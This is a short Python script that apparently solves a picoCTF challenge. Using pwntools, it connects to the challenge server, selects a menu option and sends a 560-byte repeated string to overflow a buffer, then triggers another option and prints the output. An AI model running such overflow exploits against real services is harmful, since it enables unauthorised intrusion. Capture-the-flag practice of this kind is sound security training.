from pwn import *

p = remote('tethys.picoctf.net', 57412)

send_str = b'bico' * 140

p.sendline(b'2')

p.sendline(send_str)

p.sendline(b'4')

while True:
  print(p.recv())